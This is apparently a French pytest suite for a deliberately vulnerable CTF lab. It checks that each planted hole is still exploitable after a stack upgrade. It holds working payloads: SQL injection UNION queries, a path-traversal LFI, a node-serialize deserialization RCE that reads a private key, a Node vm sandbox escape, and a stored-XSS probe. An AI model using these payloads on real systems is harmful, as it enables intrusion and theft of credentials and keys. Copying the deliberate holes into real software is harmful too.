"""Tests d'intégration : une vérification par faille / easter egg du challenge.

Chaque test rejoue (de façon adaptée) le write-up correspondant de
cflix1_exploits et affirme que le trou est toujours présent et exploitable, et
que l'easter egg attendu est toujours récupérable — malgré la modernisation de
la stack (.NET 10, Node 26, PHP 8, MySQL 9, PostgreSQL 18...).

Les épreuves dépendant d'une infrastructure externe à la stack (NAS/SMB pour la
partie exfiltration de l'épreuve 5, requestb.in pour l'épreuve 12, les épreuves
bonus basées sur des affiches/images) ne sont pas rejouées intégralement : on
vérifie le trou applicatif qui les rend possibles.
"""
import codecs
import json
import re
import subprocess

import pytest
import requests

from conftest import (
    CFLIX_URL, HACKO_URL, HACKO_HOST, ROBOTSHOP_URL, SSH_HOST,
    IMGVIEWER_SSH_PORT, HACKO_SSH_PORT, FLAGS, CARTMAN_PASSWORD, new_session,
)

UA = {"User-Agent": "cflix-tests", "Accept-Encoding": "none"}


# --------------------------------------------------------------------------- #
# Épreuve 1 — XSS stockée (Html.Raw) : easter egg caché dans un commentaire
# --------------------------------------------------------------------------- #
def test_01_xss_stored_easter_egg(user_session):
    r = user_session.get(f"{CFLIX_URL}/Media/1", headers=UA)
    assert r.status_code == 200
    # Le trou : le contenu des reviews est rendu via @Html.Raw -> le <script>
    # injecté par l'attaquant est présent tel quel (non échappé).
    assert "<script" in r.text.lower(), "le HTML brut de la review devrait passer (Html.Raw)"
    # L'easter egg est caché dans un de ces commentaires.
    assert FLAGS["p1_xss"] in r.text, "easter egg de l'épreuve 1 introuvable"


# --------------------------------------------------------------------------- #
# Épreuves 2, 3, 5 — Injection SQL (FromSqlRaw + concaténation)
# UNION pour exfiltrer le contenu des reviews cachées (ids 12, 10, 11).
# --------------------------------------------------------------------------- #
def _sqli_review(sess, review_id):
    q = (f"1' and 1=0 union select 1,2,Content,4,null,null "
         f"from Reviews where id={review_id} -- -")
    r = sess.get(f"{CFLIX_URL}/Search", params={"query": q}, headers=UA)
    assert r.status_code == 200
    assert "DBError" not in r.text, "la requête SQLi a provoqué une erreur DB"
    m = re.search(r'<img[^>]*src="2"[^>]*alt="([^"]*)"', r.text, re.S)
    assert m, f"la projection UNION (review {review_id}) n'est pas remontée dans le HTML"
    return m.group(1)


def test_02_sqli_union_review12(user_session):
    alt = _sqli_review(user_session, 12)
    assert len(alt) > 50, "contenu de la review 12 non exfiltré"
    # La review 12 est le message « officiel » contenant l'indice de l'épreuve.
    assert "Oups" in alt or "soucis" in alt


def test_03_sqli_union_review10(user_session):
    alt = _sqli_review(user_session, 10)
    # Review 10 : charge JS obfusquée (packer) cachant l'easter egg.
    assert "powned" in alt or "eval" in alt or len(alt) > 1000


def test_05_sqli_union_review11(user_session):
    alt = _sqli_review(user_session, 11)
    # Review 11 : indice menant au partage NAS (l'exfiltration SMB elle-même
    # sort du périmètre de la stack docker-compose).
    assert len(alt) > 500


# --------------------------------------------------------------------------- #
# Épreuve 4 — Mass Assignment : élévation vers le compte Alpha
# --------------------------------------------------------------------------- #
def test_04_mass_assignment_to_alpha():
    s = new_session(elevate_alpha=True)   # poste AccountType=Alpha (champ non prévu)
    r = s.get(f"{CFLIX_URL}/Profile/me", headers=UA)
    assert "Alpha" in r.text, "l'élévation en Alpha (mass assignment) a échoué"
    # Conséquence concrète : accès à la zone réservée aux Alpha (Viewer).
    r = s.get(f"{CFLIX_URL}/Viewer", params={"mediaId": "6"}, headers=UA)
    assert r.status_code == 200, "un compte Alpha devrait accéder au Viewer"


# --------------------------------------------------------------------------- #
# Épreuve 6 — mot de passe du post-it (statique) : sert d'accès à l'épreuve 7
# --------------------------------------------------------------------------- #
def test_06_postit_password_is_cartman_ssh():
    # L'easter egg de l'épreuve 6 est le mot de passe SSH de cartman (épreuve 7).
    # On le vérifie indirectement : il doit permettre l'accès SSH (cf. test 07).
    assert FLAGS["p6_postit"] == CARTMAN_PASSWORD


# --------------------------------------------------------------------------- #
# Épreuve 7 — SSH (cartman) sur l'ImageViewer + récupération du pcap
# --------------------------------------------------------------------------- #
def test_07_cartman_ssh_and_pcap(tmp_path):
    paramiko = pytest.importorskip("paramiko")
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(SSH_HOST, port=IMGVIEWER_SSH_PORT, username="cartman",
              password=CARTMAN_PASSWORD, timeout=15,
              look_for_keys=False, allow_agent=False)
    try:
        ftp = c.open_sftp()
        local = tmp_path / "capture.pcap"
        ftp.get("/app/capture_interessante.pcap", str(local))
        ftp.close()
    finally:
        c.close()
    assert local.stat().st_size > 0, "pcap vide / non récupéré"

    # Décodage optionnel (comme le write-up) si scapy est disponible. On balaie
    # les charges utiles à la recherche d'un jeton base64 décodant vers un flag
    # (robuste au format de clé de session qui varie selon la version de scapy).
    try:
        from scapy.all import rdpcap, Raw
    except Exception:
        pytest.skip("scapy absent : récupération du pcap vérifiée, décodage ignoré")
    pcap = rdpcap(str(local))
    found = None
    for pkt in pcap:
        if not pkt.haslayer(Raw):
            continue
        try:
            text = pkt[Raw].load.decode("latin-1")
        except Exception:
            continue
        for tok in re.split(r"[\s\r\n]+", text):
            if len(tok) < 8 or len(tok) % 4:
                continue
            try:
                dec = codecs.decode(tok.encode(), "base64").decode("utf-8")
            except Exception:
                continue
            if dec.startswith("CFl1X-"):
                found = dec
                break
        if found:
            break
    assert found, "aucun flag CFl1X- décodable trouvé dans le pcap"


# --------------------------------------------------------------------------- #
# Épreuve 8 — LFI / directory traversal sur le CFlix.ImageViewer
# --------------------------------------------------------------------------- #
def test_08_lfi_directory_traversal(alpha_session):
    r = alpha_session.get(f"{CFLIX_URL}/Viewer/View",
                          params={"mediaId": "6",
                                  "imageName": "../../../appsettings.json"},
                          headers=UA)
    assert r.status_code == 200
    data = json.loads(codecs.decode(r.content, "utf-8-sig"))
    assert data.get("flag") == FLAGS["p8_lfi"], "LFI : flag attendu non lu"


# --------------------------------------------------------------------------- #
# Épreuve 9 — Désérialisation NodeJS (node-serialize 0.0.4, CVE-2017-5941)
# --------------------------------------------------------------------------- #
def _nodejs_rce(command):
    payload = ('{ "payload": "_$$ND_FUNC$$_function(){ var result = '
               "require('child_process').execSync('" + command + "'); "
               'return result.toString(); }()" }')
    r = requests.post(f"{HACKO_URL}/cookie", data=payload, verify=False, timeout=20,
                      headers={**UA, "Host": HACKO_HOST,
                               "Content-Type": "application/x-www-form-urlencoded"})
    assert r.status_code == 200, f"/cookie a répondu {r.status_code}"
    return r.text


def test_09_nodeserialize_rce_passphrase():
    out = _nodejs_rce("cat README.md")
    # RCE confirmée : le README de l'attaquant contient la passphrase de la clé.
    assert FLAGS["p9_passphrase"] in out, "RCE node-serialize KO (passphrase absente)"


def test_09_nodeserialize_rce_reads_private_key():
    out = _nodejs_rce("cat id_rsa")
    assert "PRIVATE KEY" in out, "la clé privée id_rsa devrait être exfiltrable via la RCE"


# --------------------------------------------------------------------------- #
# Épreuve 10 — Évasion de la sandbox `vm` (SSH port 845) + code nucléaire
# --------------------------------------------------------------------------- #
def _hacko_ssh_key():
    """Récupère + déchiffre la clé privée via la RCE de l'épreuve 9 (chaînage)."""
    paramiko = pytest.importorskip("paramiko")
    import io
    key_pem = json.loads(_nodejs_rce("cat id_rsa"))["payload"]
    pkey = paramiko.RSAKey.from_private_key(
        io.StringIO(key_pem), password=FLAGS["p9_passphrase"])
    return paramiko, pkey


_ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")


def _hacko_vm_exec(js):
    """Exécute une commande dans la sandbox vm (vorpal) via SSH (user hackonymousoflix).

    Le shell de login est vm.js (vorpal, interactif) : on ouvre un shell, on
    laisse défiler la bannière, on envoie la commande, puis on lit la sortie en
    nettoyant les séquences ANSI d'édition de ligne.
    """
    import time
    paramiko, pkey = _hacko_ssh_key()
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(SSH_HOST, port=HACKO_SSH_PORT, username="hackonymousoflix",
              pkey=pkey, timeout=20, look_for_keys=False, allow_agent=False)
    try:
        chan = c.invoke_shell()
        chan.settimeout(1.0)

        def drain(seconds):
            buf = b""
            end = time.time() + seconds
            while time.time() < end:
                try:
                    data = chan.recv(65535)
                    if not data:
                        break
                    buf += data
                except Exception:
                    time.sleep(0.1)
            return buf

        drain(2.5)                 # bannière / invite vorpal
        chan.sendall(js + "\n")
        out = drain(4.0)
        return _ANSI.sub("", out.decode("latin-1")).replace("\r", "")
    finally:
        c.close()


def test_10_vm_sandbox_escape_reads_nuclear_access():
    # Évasion du contexte vm : on lit un fichier hors sandbox via le constructeur
    # de constructeur (process.mainModule...). On cible .shell.sh qui contient
    # NUCLEAR_BOMB_ACCESS, prouvant l'évasion.
    js = ("exec eval(String('t').concat('his')).constructor.constructor("
          "String('console.l').concat"
          "('og(process.mainModule.constructor._load(\\'fs\\')"
          ".readFileSync(\\'/home/hackonymousoflix/.shell.sh\\').toString())'))()")
    out = _hacko_vm_exec(js)
    assert FLAGS["p10_access"] in out, \
        "évasion vm KO : NUCLEAR_BOMB_ACCESS non lu hors sandbox"


def test_10_nuclear_password_accepted():
    # Easter egg : le bon code nucléaire déclenche la séquence (régression
    # critique corrigée : crypto.createCipher supprimé en Node 18+).
    js = f"launchnb none {FLAGS['p10_nuclear']}"
    out = _hacko_vm_exec(js)
    assert ("Félicitations" in out or "troisième guerre" in out or "bash" in out), \
        "le code nucléaire n'est plus accepté (régression crypto.createCipher ?)"


# --------------------------------------------------------------------------- #
# Épreuve 11 — Exploitation binaire : propriétés qui rendent le ret2win possible
# --------------------------------------------------------------------------- #
def _hacko_container():
    import os
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    return base  # non utilisé, cf. docker


def _compose_dir():
    import os
    return os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "src")


def _docker_exec(service, cmd):
    return subprocess.check_output(
        ["docker", "compose", "exec", "-T", service, "sh", "-c", cmd],
        cwd=_compose_dir(), text=True, stderr=subprocess.DEVNULL)


def _docker_compose(*args):
    subprocess.run(["docker", "compose", *args], cwd=_compose_dir(),
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)


def test_11_binary_is_exploitable_by_design():
    # Le binaire setuid doit rester non-PIE (adresse fixe de `faille`) et
    # sans protections, sinon le write-up ret2win ne fonctionnerait plus.
    ls = _docker_exec("hackonymousoflix", "ls -l /home/will.byers/exploit")
    assert ls.startswith("-rws"), f"le bit setuid manque : {ls!r}"
    etype = _docker_exec("hackonymousoflix", "readelf -h /home/will.byers/exploit | grep Type:")
    assert "EXEC" in etype, f"le binaire ne doit pas être PIE (ret2win) : {etype!r}"
    faille = _docker_exec("hackonymousoflix",
                          "objdump -d /home/will.byers/exploit | grep '<faille>:'")
    assert "faille" in faille, "symbole `faille` (la cible du ret2win) absent"


# --------------------------------------------------------------------------- #
# Épreuve 12 — RobotShop (PHP) : XSS stockée + page admin protégée par cookie
# --------------------------------------------------------------------------- #
def test_12_robotshop_admin_flag_via_cookie():
    r = requests.get(f"{ROBOTSHOP_URL}/shop_administrator.php",
                     cookies={"adminCookie": FLAGS["admin_cookie"]},
                     headers=UA, timeout=15)
    assert r.status_code == 200
    assert FLAGS["p12_robotshop"] in r.text, "flag admin RobotShop introuvable"


def test_12_robotshop_contact_is_xss_sink():
    # Le trou : contact.php stocke le message sans échappement (xssSanitizer est
    # un no-op) -> le bot admin (shoxx-bot) l'exécute en consultant read.php
    # (vol de cookie à l'origine). On met le bot en pause pour que read.php ne
    # soit pas vidé par lui pendant la vérification du sink.
    marker = "<script>/*cflix-xss-probe*/</script>"
    _docker_compose("pause", "shoxxbot")
    try:
        requests.post(f"{ROBOTSHOP_URL}/contact.php",
                      data={"message": marker},
                      headers={**UA, "Content-Type": "application/x-www-form-urlencoded"},
                      timeout=15)
        r = requests.get(f"{ROBOTSHOP_URL}/read.php",
                         cookies={"adminCookie": FLAGS["admin_cookie"]},
                         headers=UA, timeout=15)
    finally:
        _docker_compose("unpause", "shoxxbot")
    assert r.status_code == 200
    assert marker in r.text, "read.php devrait restituer le message brut (sink XSS)"
